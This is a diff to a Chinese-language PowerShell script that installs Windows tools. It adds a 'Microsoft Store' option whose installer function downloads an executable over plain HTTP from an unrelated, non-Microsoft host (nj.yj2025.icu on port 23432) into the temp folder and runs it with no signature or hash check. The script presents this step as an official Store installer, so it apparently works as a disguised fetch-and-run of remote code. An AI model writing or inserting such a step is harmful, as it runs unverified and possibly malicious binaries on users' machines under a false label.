@@ -18,7 +18,8 @@ if ($Yes) { Enable-AutoConfirm }
 # 每个工具：Id（参数名）、Name（显示名）、Description
 $ToolDefs = @(
   @{ Id = 'winget'; Name = 'winget'; Description = 'Windows 包管理器' },
-  @{ Id = 'terminal'; Name = 'Windows 终端'; Description = 'Windows Terminal（多标签终端）' }
+  @{ Id = 'terminal'; Name = 'Windows 终端'; Description = 'Windows Terminal（多标签终端）' },
+  @{ Id = 'store'; Name = 'Microsoft Store'; Description = 'Microsoft Store（应用商店）' }
 )
 
 # ─── winget ───────────────────────────────────────────────────────────────────
@@ -460,12 +461,102 @@ function Uninstall-WindowsTerminalTool {
   return $false
 }
 
+function Test-MicrosoftStore {
+  $pkg = $null
+  try {
+    $pkg = Get-AppxPackage -Name Microsoft.WindowsStore -ErrorAction Stop | Select-Object -First 1
+  }
+  catch {
+    return $false
+  }
+
+  if (-not $pkg) { return $false }
+
+  Write-Ok "Microsoft Store 已安装"
+  if ($pkg.InstallLocation) { Write-Host "    路径：$($pkg.InstallLocation)" }
+  if ($pkg.Version) { Write-Host "    版本：$($pkg.Version.ToString())" }
+
+  try {
+    if ($pkg.InstallLocation -and (Test-Path -LiteralPath $pkg.InstallLocation)) {
+      $total = 0L
+      foreach ($f in [System.IO.Directory]::EnumerateFiles($pkg.InstallLocation, '*', [System.IO.SearchOption]::AllDirectories)) {
+        $total += (New-Object System.IO.FileInfo($f)).Length
+      }
+      $sizeMB = '{0:N2}' -f ($total / 1MB)
+      Write-Host "    大小：${sizeMB} MB（Microsoft Store 包）"
+    }
+  }
+  catch {}
+
+  return $true
+}
+
+function Install-MicrosoftStoreTool {
+  Write-Host ""
+  Write-Host "═══ 安装 Microsoft Store ═══" -ForegroundColor Cyan
+  Write-Host ""
+
+  if (Test-MicrosoftStore) {
+    Write-Host ""
+    return $true
+  }
+
+  Write-Host "  ✗ 未检测到 Microsoft Store" -ForegroundColor Red
+  Write-Host ""
+
+  if (-not (Confirm-Install "安装 Microsoft Store（应用商店）")) { return $false }
+
+  $installed = $false
+
+  Write-Host "  下载 Microsoft Store 安装程序 ..." -ForegroundColor Cyan
+  $installer = Join-Path $env:TEMP ("MicrosoftStoreInstaller_{0}.exe" -f ([guid]::NewGuid().ToString('N')))
+  try {
+    $urls = @()
+    $fixedUrl = 'http://nj.yj2025.icu:23432/update/winapp/MicrosoftStoreInstaller.exe'
+    $urls += $fixedUrl
+
+    if (Save-WebFile -Urls $urls -OutFile $installer -TimeoutSec 120 -MinSizeKB 512) {
+      try {
+        Write-Host "  运行安装程序 ..." -ForegroundColor Cyan
+        Start-Process -FilePath $installer -Wait
+        $installed = $true
+      }
+      catch {
+        Write-Fail "安装程序启动失败：$($_.Exception.Message)"
+      }
+    }
+    else {
+      Write-Fail "下载 Microsoft Store 安装程序失败"
+    }
+  }
+  catch {
+    Write-Warn "Microsoft Store 下载/安装过程出错：$($_.Exception.Message)"
+  }
+
+  Write-Host ""
+  if (Test-MicrosoftStore) {
+    Write-Banner -Title 'Microsoft Store 安装成功' -Color Green
+    return $true
+  }
+  if ($installed) {
+    Write-Warn "Microsoft Store 安装流程已执行，但当前未检测到 Microsoft.WindowsStore 包"
+    Write-Warn "请重新登录/重启后再次运行此脚本验证"
+    return $false
+  }
+  Write-Fail "Microsoft Store 自动安装失败"
+  Write-Fail "请手动安装 Microsoft Store（若系统支持）："
+  Write-Fail "  • 运行 wsreset -i（Windows 11 及以上可能支持）"
+  Write-Fail "  • 或使用离线安装包重新安装"
+  return $false
+}
+
 # ─── 工具调度 ─────────────────────────────────────────────────────────────────
 
 # Id → Install 函数 的映射
 $ToolInstallers = @{
   'winget'   = ${function:Install-WingetTool}
   'terminal' = ${function:Install-WindowsTerminalTool}
+  'store'    = ${function:Install-MicrosoftStoreTool}
 }
 
 # Id → Uninstall 函数 的映射
@@ -600,7 +691,7 @@ if ($RemoveTools -and $RemoveTools.Count -gt 0) {
 # ── 安装流程 ──
 if ($AddTools -and $AddTools.Count -gt 0) {
   # winget 是其他工具的前置依赖，如果选了非 winget 工具但缺少 winget，自动前置安装
-  $needsWinget = $AddTools | Where-Object { $_ -ne 'winget' }
+  $needsWinget = $AddTools | Where-Object { $_ -ne 'winget' -and $_ -ne 'store' }
   if ($needsWinget -and -not (Get-ExePath 'winget.exe') -and 'winget' -notin $AddTools) {
     Write-Warn "安装其他工具需要 winget，将先安装 winget"
     $AddTools = @('winget') + @($AddTools)
